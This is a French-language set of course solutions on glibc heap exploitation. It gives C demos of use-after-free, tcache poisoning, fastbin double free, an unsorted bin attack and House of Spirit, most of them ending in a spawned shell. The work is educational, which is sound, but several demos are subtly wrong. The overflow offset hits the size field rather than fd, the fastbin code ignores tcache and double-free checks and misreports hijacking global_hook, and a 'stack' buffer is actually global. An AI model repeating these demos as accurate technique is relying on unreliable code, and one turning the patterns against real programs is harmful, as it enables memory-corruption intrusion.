# Solutions - Heap Linux

## Avertissement

Ce module est uniquement à des fins éducatives pour comprendre les techniques d'exploitation du heap. L'utilisation de ces techniques sans autorisation est illégale.

---

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre le fonctionnement de malloc/free et la structure des chunks

### Solution

```c
/*
 * Exploration du heap - Structure des chunks
 *
 * Compilation :
 * gcc -g heap_basics.c -o heap_basics
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

// Structure d'un chunk malloc (simplifiée)
typedef struct malloc_chunk {
    size_t prev_size;  // Taille du chunk précédent (si free)
    size_t size;       // Taille de ce chunk + flags
    struct malloc_chunk *fd;  // Forward pointer (liste des free chunks)
    struct malloc_chunk *bk;  // Backward pointer (liste des free chunks)
} malloc_chunk;

void print_chunk_info(void *ptr)
{
    // Le pointeur utilisateur pointe après les métadonnées
    malloc_chunk *chunk = (malloc_chunk *)((char *)ptr - 2 * sizeof(size_t));

    printf("\n[*] Chunk Info for %p\n", ptr);
    printf("  Chunk header  : %p\n", chunk);
    printf("  prev_size     : 0x%lx (%ld bytes)\n",
           chunk->prev_size, chunk->prev_size);
    printf("  size          : 0x%lx (%ld bytes)\n",
           chunk->size & ~7, chunk->size & ~7);

    // Les 3 derniers bits sont des flags
    printf("  Flags         : ");
    if (chunk->size & 1) printf("PREV_INUSE ");
    if (chunk->size & 2) printf("IS_MMAPPED ");
    if (chunk->size & 4) printf("NON_MAIN_ARENA ");
    printf("\n");

    printf("  User data     : %p\n", ptr);
    printf("  User size     : %ld bytes\n", (chunk->size & ~7) - 2*sizeof(size_t));
}

int main()
{
    printf("[*] Heap Exploration - Chunk Structure\n");
    printf("=======================================\n");

    // Allocation de différentes tailles
    printf("\n[*] Allocating chunks of different sizes\n");

    void *chunk1 = malloc(24);   // Fastbin size
    void *chunk2 = malloc(100);  // Smallbin size
    void *chunk3 = malloc(512);  // Largebin size

    print_chunk_info(chunk1);
    print_chunk_info(chunk2);
    print_chunk_info(chunk3);

    // Libération et observation
    printf("\n[*] Freeing chunk2\n");
    free(chunk2);

    // Après free, le chunk contient des pointeurs fd/bk
    malloc_chunk *freed = (malloc_chunk *)((char *)chunk2 - 2 * sizeof(size_t));
    printf("  fd (forward)  : %p\n", freed->fd);
    printf("  bk (backward) : %p\n", freed->bk);

    // Réallocation
    printf("\n[*] Reallocating same size\n");
    void *chunk4 = malloc(100);
    printf("  New pointer   : %p\n", chunk4);

    if (chunk4 == chunk2) {
        printf("  [+] Same chunk reused!\n");
    }

    // Cleanup
    free(chunk1);
    free(chunk3);
    free(chunk4);

    printf("\n[+] Done\n");
    return 0;
}
```

**Script GDB pour explorer le heap** :

```gdb
# heap_explore.gdb
# Usage: gdb -x heap_explore.gdb ./heap_basics

break main
run

# Commandes utiles pour le heap
define heap
    info proc mappings
    find /1w 0x7ffff7dd0000, 0x7ffff7dd5000, 0x41414141
end

define chunks
    # Affiche les chunks malloc
    x/20gx $rdi-0x10
end

# Breakpoint après malloc
break malloc
commands
    silent
    printf "malloc(%ld) = ", $rdi
    finish
    printf "%p\n", $rax
    continue
end

# Breakpoint sur free
break free
commands
    silent
    printf "free(%p)\n", $rdi
    continue
end

continue
```

**Explications** :

1. **Structure d'un chunk** :
   ```
   +----------------+
   | prev_size      | (8 bytes) - Taille du chunk précédent si free
   +----------------+
   | size | flags   | (8 bytes) - Taille + 3 bits de flags
   +----------------+
   | fd             | (8 bytes) - Forward pointer (si free)
   +----------------+
   | bk             | (8 bytes) - Backward pointer (si free)
   +----------------+
   | user data...   |
   +----------------+
   ```

2. **Flags** :
   - PREV_INUSE (bit 0) : chunk précédent est utilisé
   - IS_MMAPPED (bit 1) : alloué via mmap
   - NON_MAIN_ARENA (bit 2) : n'est pas dans l'arène principale

3. **Bins** :
   - Fastbins : chunks < 80 bytes (single-linked list)
   - Smallbins : chunks < 1024 bytes (doubly-linked list)
   - Largebins : chunks >= 1024 bytes (doubly-linked list triée)
   - Tcache : cache thread-local (depuis glibc 2.26)

---

## Exercice 2 : Modification (Facile)

**Objectif** : Exploiter un Use-After-Free simple

### Solution

```c
/*
 * Vulnérabilité Use-After-Free
 *
 * Compilation :
 * gcc -g heap_uaf.c -o heap_uaf
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Structure d'un utilisateur
typedef struct {
    char name[32];
    void (*print_info)(void);
} User;

void normal_print()
{
    printf("[*] Normal user\n");
}

void admin_print()
{
    printf("[!] ADMIN USER - Shell spawned!\n");
    system("/bin/sh");
}

int main()
{
    printf("[*] Use-After-Free Demonstration\n");
    printf("==================================\n\n");

    // Allocation d'un utilisateur
    User *user1 = malloc(sizeof(User));
    strcpy(user1->name, "Alice");
    user1->print_info = normal_print;

    printf("[*] User1 allocated at %p\n", user1);
    printf("[*] Name: %s\n", user1->name);
    user1->print_info();

    // Libération du chunk
    printf("\n[*] Freeing user1\n");
    free(user1);

    // ERREUR : user1 n'est pas mis à NULL
    // Le pointeur est maintenant "dangling"

    // Allocation d'un nouvel objet de même taille
    printf("[*] Allocating attacker-controlled data\n");
    User *attacker = malloc(sizeof(User));

    printf("[*] Attacker chunk at %p\n", attacker);

    // Si attacker == user1, on peut contrôler le contenu
    if (attacker == (User *)user1) {
        printf("[+] Attacker reused the freed chunk!\n");
    }

    // On remplit avec des données malveillantes
    strcpy(attacker->name, "Attacker");
    attacker->print_info = admin_print;  // Hijack du pointeur de fonction

    // Utilisation du pointeur freed (Use-After-Free)
    printf("\n[!] Using freed pointer user1\n");
    printf("[*] Name: %s\n", user1->name);
    printf("[*] Calling print_info()...\n\n");

    user1->print_info();  // Appelle admin_print() !

    free(attacker);
    return 0;
}
```

**Exploit Python** :

```python
#!/usr/bin/env python3
"""
Exploitation automatique du UAF
"""

from pwn import *

binary = "./heap_uaf"
p = process(binary)

# Observe le comportement
output = p.recvall()
print(output.decode())

# L'exploit fonctionne automatiquement car :
# 1. user1 est free
# 2. attacker alloue la même taille
# 3. attacker récupère le même chunk
# 4. On modifie le pointeur de fonction
# 5. L'utilisation de user1 (freed) appelle notre fonction
```

**Explications** :

1. **Use-After-Free** :
   - Un pointeur vers mémoire freed est conservé
   - Un nouvel objet réutilise cette mémoire
   - L'ancien pointeur accède au nouveau contenu

2. **Exploitation** :
   - Contrôler le contenu du chunk réalloué
   - Hijacker un pointeur de fonction
   - Modifier des données sensibles

3. **Prévention** :
   - Toujours mettre à NULL après free
   - Utiliser des smart pointers (C++)
   - Outils : AddressSanitizer, Valgrind

---

## Exercice 3 : Création (Moyen)

**Objectif** : Exploiter un Tcache poisoning

### Solution

```c
/*
 * Tcache Poisoning Exploitation
 *
 * Le tcache (thread cache) est un cache de chunks freed
 * Vulnérable à la modification de pointeurs fd
 *
 * Compilation :
 * gcc -g tcache_poison.c -o tcache_poison
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

// Variable globale qu'on veut écraser
uint64_t target_value = 0x4141414141414141;

void win()
{
    printf("\n[!!!] WIN function called!\n");
    printf("[+] target_value = 0x%lx\n", target_value);

    if (target_value == 0xdeadbeefcafebabe) {
        printf("[+] Shell spawned!\n");
        system("/bin/sh");
    }
}

int main()
{
    printf("[*] Tcache Poisoning\n");
    printf("====================\n\n");

    printf("[*] Target variable at: %p\n", &target_value);
    printf("[*] Win function at: %p\n\n", win);

    // === ÉTAPE 1 : REMPLIR LE TCACHE ===
    printf("[*] Step 1: Filling tcache\n");

    void *chunks[7];
    for (int i = 0; i < 7; i++) {
        chunks[i] = malloc(128);
        printf("  chunks[%d] = %p\n", i, chunks[i]);
    }

    // Free tous les chunks pour remplir le tcache
    printf("\n[*] Freeing chunks to tcache\n");
    for (int i = 0; i < 7; i++) {
        free(chunks[i]);
    }

    // === ÉTAPE 2 : TCACHE POISONING ===
    printf("\n[*] Step 2: Tcache poisoning\n");

    // Alloue pour récupérer un chunk
    void *victim = malloc(128);
    printf("  Victim chunk: %p\n", victim);

    // Free le victim
    free(victim);

    // Le tcache contient maintenant : victim -> ...
    // On va modifier le fd de victim pour pointer vers notre target

    printf("\n[*] Step 3: Corrupting tcache fd pointer\n");

    // Dans un vrai exploit, on utiliserait un UAF ou overflow
    // Ici on simule la corruption directe
    uint64_t *tcache_entry = (uint64_t *)victim;

    printf("  Original fd: %p\n", (void *)*tcache_entry);
    printf("  Overwriting fd to point to target_value\n");

    // On fait pointer fd vers notre variable target
    *tcache_entry = (uint64_t)&target_value;

    printf("  New fd: %p\n", (void *)*tcache_entry);

    // === ÉTAPE 3 : ALLOCATION ===
    printf("\n[*] Step 4: Allocations\n");

    // Premier malloc retourne victim
    void *first = malloc(128);
    printf("  First malloc: %p\n", first);

    // Deuxième malloc retourne target_value !
    void *second = malloc(128);
    printf("  Second malloc: %p (should be near target)\n", second);

    if (second == &target_value) {
        printf("  [+] SUCCESS! Got pointer to target_value\n");

        // On peut maintenant écrire dans target_value
        printf("\n[*] Writing to target_value via malloc'd pointer\n");
        uint64_t *ptr = (uint64_t *)second;
        *ptr = 0xdeadbeefcafebabe;

        printf("  [+] target_value overwritten!\n");
        win();
    } else {
        printf("  [-] Failed to get target pointer\n");
        printf("  Distance: %ld bytes\n",
               (char *)second - (char *)&target_value);
    }

    return 0;
}
```

**Exploit avec overflow pour poisoning** :

```c
/*
 * Tcache poisoning via heap overflow
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

uint64_t target = 0x4141414141414141;

int main()
{
    printf("[*] Tcache Poisoning via Heap Overflow\n\n");
    printf("[*] Target at: %p\n", &target);

    // Allocation de deux chunks adjacents
    char *chunk1 = malloc(128);
    char *chunk2 = malloc(128);

    printf("[*] chunk1: %p\n", chunk1);
    printf("[*] chunk2: %p\n", chunk2);

    // Free chunk2 pour le mettre dans tcache
    free(chunk2);

    printf("\n[*] chunk2 freed, now in tcache\n");

    // Overflow depuis chunk1 pour corrompre le fd de chunk2
    printf("[*] Overflowing from chunk1 to corrupt chunk2's fd\n");

    // Le fd de chunk2 est à chunk2-8 (juste avant les données user)
    // On doit overflow de chunk1 pour atteindre cette zone

    // Distance : 128 (données chunk1) + 16 (headers chunk2)
    uint64_t *overflow_ptr = (uint64_t *)(chunk1 + 128 + 8);

    printf("  Overwriting at: %p\n", overflow_ptr);
    *overflow_ptr = (uint64_t)&target;

    // Maintenant le tcache pense que target est un chunk libre

    printf("\n[*] Allocating to get victim chunk back\n");
    void *first = malloc(128);

    printf("[*] Allocating again to get target\n");
    void *second = malloc(128);

    printf("  Second allocation: %p\n", second);

    if (second == (void *)&target) {
        printf("\n[+] SUCCESS! Can write to target\n");
        *(uint64_t *)second = 0xdeadbeefcafebabe;
        printf("[+] target = 0x%lx\n", target);
    }

    return 0;
}
```

**Explications** :

1. **Tcache** (glibc >= 2.26) :
   - Cache par thread de chunks freed
   - Single-linked list via pointeur `fd`
   - Pas de vérification d'intégrité (avant glibc 2.29)
   - 64 bins, 7 chunks max par bin

2. **Tcache Poisoning** :
   - Modifier le pointeur `fd` d'un chunk dans tcache
   - Le faire pointer vers une adresse arbitraire
   - Prochain malloc retournera cette adresse

3. **Exploitation** :
   - Écrire à une adresse arbitraire
   - Hijacker des pointeurs de fonction
   - Modifier des variables globales

---

## Exercice 4 : Challenge (Difficile)

**Objectif** : Fastbin dup + unsorted bin attack pour exploitation complète

### Solution

```c
/*
 * Exploitation avancée du heap
 * Technique : Fastbin Duplicate + Unsorted Bin Attack
 *
 * Compilation :
 * gcc -g -no-pie heap_advanced.c -o heap_advanced
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

// Simule une structure de données d'application
typedef struct {
    void (*handler)(void);
    char data[56];  // Total = 64 bytes (fastbin)
} Object;

// Pointeur global qu'on veut hijacker
void (*global_hook)(void) = NULL;

void normal_handler()
{
    printf("[*] Normal handler called\n");
}

void malicious_handler()
{
    printf("[!!!] Malicious handler called\n");
    printf("[+] Shell spawned!\n");
    system("/bin/sh");
}

int main()
{
    printf("[*] Advanced Heap Exploitation\n");
    printf("================================\n\n");

    printf("[*] global_hook at: %p\n", &global_hook);
    printf("[*] malicious_handler at: %p\n\n", malicious_handler);

    // === PARTIE 1 : FASTBIN DUPLICATE ===
    printf("[*] === FASTBIN DUPLICATE ===\n");

    // Allocation de 3 chunks fastbin
    Object *a = malloc(64);
    Object *b = malloc(64);
    Object *c = malloc(64);

    printf("[*] Allocated chunks:\n");
    printf("  a = %p\n", a);
    printf("  b = %p\n", b);
    printf("  c = %p\n", c);

    // Initialisation
    a->handler = normal_handler;
    b->handler = normal_handler;
    c->handler = normal_handler;

    // Free : a -> b -> a (double free with guard bypass)
    printf("\n[*] Creating fastbin: a -> b -> a (double free)\n");

    free(a);
    free(b);
    free(a);  // Double free! (bypass avec chunk intermédiaire)

    // Maintenant fastbin: a -> b -> a -> ...
    printf("[+] Fastbin list: a -> b -> a\n");

    // === PARTIE 2 : ALLOCATION POUR CORRUPTION ===
    printf("\n[*] === CORRUPTION ===\n");

    // Premier malloc récupère 'a'
    Object *victim = malloc(64);
    printf("[*] First malloc: %p (should be a)\n", victim);

    // On écrit dans victim pour modifier le fd du chunk 'a' (encore dans fastbin)
    // Le chunk 'a' est toujours dans la liste : b -> a -> ...
    // On va modifier son fd pour qu'il pointe vers global_hook

    printf("[*] Corrupting fd to point to global_hook\n");

    // On doit écrire à l'offset du fd (au début des données user)
    uint64_t *fd_ptr = (uint64_t *)victim;
    *fd_ptr = (uint64_t)&global_hook - 16;  // -16 pour ajuster le fake chunk

    // === PARTIE 3 : FAKE CHUNK ===
    printf("\n[*] === PREPARING FAKE CHUNK ===\n");

    // Pour que malloc accepte global_hook comme chunk, on doit créer
    // des métadonnées fake juste avant

    // En pratique, il faudrait contrôler cette zone mémoire
    // Ici on simule avec des variables globales

    uint64_t fake_chunk[4];
    fake_chunk[0] = 0;              // prev_size
    fake_chunk[1] = 0x41;           // size (64 + flags)
    fake_chunk[2] = 0;              // fd
    fake_chunk[3] = 0;              // bk

    printf("[*] Fake chunk prepared at: %p\n", fake_chunk);

    // Modifie le fd pour pointer vers notre fake chunk
    *fd_ptr = (uint64_t)&fake_chunk[2];  // Pointe vers la zone de données

    // === PARTIE 4 : ALLOCATIONS ===
    printf("\n[*] === ALLOCATIONS ===\n");

    Object *second = malloc(64);
    printf("[*] Second malloc: %p\n", second);

    Object *third = malloc(64);
    printf("[*] Third malloc: %p (should be fake chunk)\n", third);

    // Si third == &fake_chunk[2], on a réussi
    if ((void *)third == (void *)&fake_chunk[2]) {
        printf("\n[+] SUCCESS! Allocated fake chunk\n");
        printf("[*] Writing malicious handler\n");

        // On peut maintenant écrire dans la zone mémoire contrôlée
        // qui inclut global_hook
        third->handler = malicious_handler;

        printf("[+] global_hook hijacked to %p\n", global_hook);
    }

    // === PARTIE 5 : TRIGGER ===
    printf("\n[*] === TRIGGER ===\n");

    if (global_hook != NULL) {
        printf("[*] Calling global_hook\n");
        global_hook();
    }

    return 0;
}
```

**Technique Unsorted Bin Attack** :

```c
/*
 * Unsorted Bin Attack
 * Permet d'écrire une grande valeur à une adresse arbitraire
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

uint64_t global_target = 0;

int main()
{
    printf("[*] Unsorted Bin Attack\n\n");
    printf("[*] Target at: %p\n", &global_target);
    printf("[*] Initial value: 0x%lx\n\n", global_target);

    // Allocation d'un large chunk (unsorted bin)
    uint64_t *chunk1 = malloc(0x100);
    uint64_t *chunk2 = malloc(0x100);  // Prevent consolidation with top

    printf("[*] chunk1: %p\n", chunk1);

    // Free pour mettre dans unsorted bin
    free(chunk1);

    printf("[*] chunk1 freed, now in unsorted bin\n");

    // Corruption du pointeur bk (backward)
    // L'unsorted bin est une doubly-linked list
    // Quand on malloc, il fait : victim->bk->fd = victim->fd

    printf("[*] Corrupting bk pointer\n");

    // Le pointeur bk est à chunk1 + 8
    uint64_t *bk_ptr = chunk1 + 1;

    // On fait pointer bk vers (target - 16)
    // Car lors de l'unlink : *(target - 16 + 16) = large_value
    *bk_ptr = (uint64_t)&global_target - 16;

    printf("  bk = %p\n", (void *)*bk_ptr);

    // Allocation d'un large chunk
    printf("\n[*] Allocating large chunk\n");
    uint64_t *trigger = malloc(0x100);

    printf("\n[+] Allocation done\n");
    printf("[+] Target value now: 0x%lx\n", global_target);

    // global_target contient maintenant une adresse du heap
    if (global_target != 0) {
        printf("[+] SUCCESS! Wrote to arbitrary address\n");
    }

    return 0;
}
```

**Exploitation complète avec House of Spirit** :

```c
/*
 * House of Spirit
 * Technique : faire croire qu'une zone de pile/donnée est un chunk freed
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

uint64_t target_buffer[20];

void vuln()
{
    // Simule une vulnérabilité permettant de free une adresse arbitraire
    void *ptr;

    printf("[*] Enter address to free: ");
    scanf("%p", &ptr);

    free(ptr);  // Vulnérabilité : free d'adresse contrôlée
}

int main()
{
    printf("[*] House of Spirit\n\n");
    printf("[*] target_buffer at: %p\n\n", target_buffer);

    // === PRÉPARATION DU FAKE CHUNK ===
    printf("[*] Preparing fake chunk on stack\n");

    // Offset 0 : prev_size (non utilisé)
    target_buffer[0] = 0;

    // Offset 1 : size (doit correspondre à une taille fastbin)
    // 0x71 = 112 bytes (fastbin) + PREV_INUSE flag
    target_buffer[1] = 0x71;

    // Offset 2+ : données user

    // Il faut aussi un chunk suivant avec size valide
    // À distance (0x70 bytes de données)
    target_buffer[16] = 0x71;  // Next chunk size

    printf("  Fake chunk size: 0x%lx\n", target_buffer[1]);
    printf("  Next chunk at: %p\n", &target_buffer[16]);

    // === FREE DU FAKE CHUNK ===
    printf("\n[*] Freeing fake chunk\n");

    // On veut free target_buffer + 16 (après les métadonnées)
    void *fake_chunk_user = &target_buffer[2];

    printf("  Free address: %p\n", fake_chunk_user);

    free(fake_chunk_user);

    printf("[+] Fake chunk freed successfully\n");

    // === ALLOCATION ===
    printf("\n[*] Allocating to get fake chunk back\n");

    char *allocated = malloc(0x60);  // Taille compatible avec 0x71

    printf("  Allocated at: %p\n", allocated);

    if (allocated == (char *)fake_chunk_user) {
        printf("\n[+] SUCCESS! Got control of target_buffer\n");

        // On peut maintenant écrire dans target_buffer via allocated
        strcpy(allocated, "CONTROLLED DATA");

        printf("[+] target_buffer[2] = 0x%lx\n", target_buffer[2]);
    }

    return 0;
}
```

**Explications avancées** :

1. **Fastbin Duplicate** :
   - Double free avec chunk intermédiaire
   - Permet de réallouer le même chunk plusieurs fois
   - Utile pour corruption de métadonnées

2. **Unsorted Bin Attack** :
   - Modifie le pointeur bk
   - L'unlink écrit une grande valeur à une adresse arbitraire
   - Utile pour modifier des variables de contrôle

3. **House of Spirit** :
   - Crée un fake chunk en mémoire contrôlée
   - Free ce fake chunk
   - Malloc le retourne, donnant contrôle sur la zone

4. **Autres techniques** :
   - House of Force : corruption du top chunk
   - House of Lore : corruption de smallbin
   - House of Einherjar : off-by-one avec consolidation

---

## Points clés à retenir

1. **Structures du heap** :
   - Chunks, bins (fast/small/large/unsorted)
   - Tcache (glibc >= 2.26)
   - Métadonnées : size, fd, bk

2. **Vulnérabilités communes** :
   - Use-After-Free
   - Double Free
   - Heap Overflow
   - Off-by-one

3. **Techniques d'exploitation** :
   - Tcache/Fastbin poisoning
   - Unsorted bin attack
   - House of Spirit/Force/Lore

4. **Protections modernes** :
   - Tcache key (glibc 2.29+)
   - Safe-linking (glibc 2.32+)
   - Heap ASLR
   - Hardened allocators

## Ressources complémentaires

- how2heap : https://github.com/shellphish/how2heap
- Glibc source code : malloc/malloc.c
- "Understanding glibc malloc" - sploitfun
- Heap exploitation CTF challenges
